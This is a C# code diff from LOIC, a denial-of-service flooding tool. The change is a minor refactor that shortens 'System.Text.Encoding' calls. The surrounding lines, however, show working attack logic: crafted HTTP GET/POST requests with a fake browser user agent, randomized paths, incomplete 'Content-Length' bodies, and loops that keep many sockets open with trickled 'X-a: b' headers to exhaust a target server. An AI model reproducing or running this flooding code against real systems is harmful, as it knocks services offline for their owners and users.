@@ -233,7 +233,7 @@ namespace LOIC
 										string header = "";
 										while (!header.Contains(Environment.NewLine + Environment.NewLine) && (socket.Receive(rbuf) >= bsize))
 										{
-											header += System.Text.Encoding.ASCII.GetString(rbuf);
+											header += Encoding.ASCII.GetString(rbuf);
 										}
 										string[] sp = header.Split(new char[]{'\r','\n'}, StringSplitOptions.RemoveEmptyEntries);
 										for (int i = (sp.Length - 1); this.IsFlooding && i >= 0; i--)
@@ -428,8 +428,8 @@ namespace LOIC
 			try
 			{
 				// header set-up
-				byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}Host: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, (_useget ? "GET" : "POST"), (_usegZip ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
-				byte[] tbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("X-a: b{0}", Environment.NewLine));
+				byte[] sbuf = Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}Host: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, (_useget ? "GET" : "POST"), (_usegZip ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
+				byte[] tbuf = Encoding.ASCII.GetBytes(String.Format("X-a: b{0}", Environment.NewLine));
 				DateTime stop = DateTime.UtcNow;
 				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);
 
@@ -443,7 +443,7 @@ namespace LOIC
 					while (this.IsFlooding && this.IsDelayed && DateTime.UtcNow < stop)
 					{
 						if (_random == true)
-							sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{4} {0}{1} HTTP/1.1{2}Host: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}", _subSite, Functions.RandomString(), Environment.NewLine, _dns, (_useget ? "GET" : "POST"), (_usegZip ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
+							sbuf = Encoding.ASCII.GetBytes(String.Format("{4} {0}{1} HTTP/1.1{2}Host: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}", _subSite, Functions.RandomString(), Environment.NewLine, _dns, (_useget ? "GET" : "POST"), (_usegZip ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
 
 						Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
 						try
@@ -470,7 +470,7 @@ namespace LOIC
 					State = ReqState.Requesting;
 					if (_randcmds)
 					{
-						tbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("X-a: b{0}{1}", Functions.RandomString(), Environment.NewLine));
+						tbuf = Encoding.ASCII.GetBytes(String.Format("X-a: b{0}{1}", Functions.RandomString(), Environment.NewLine));
 					}
 					for (int i = (_lSockets.Count - 1); this.IsFlooding && i >= 0; i--)
 					{ // keep the sockets alive
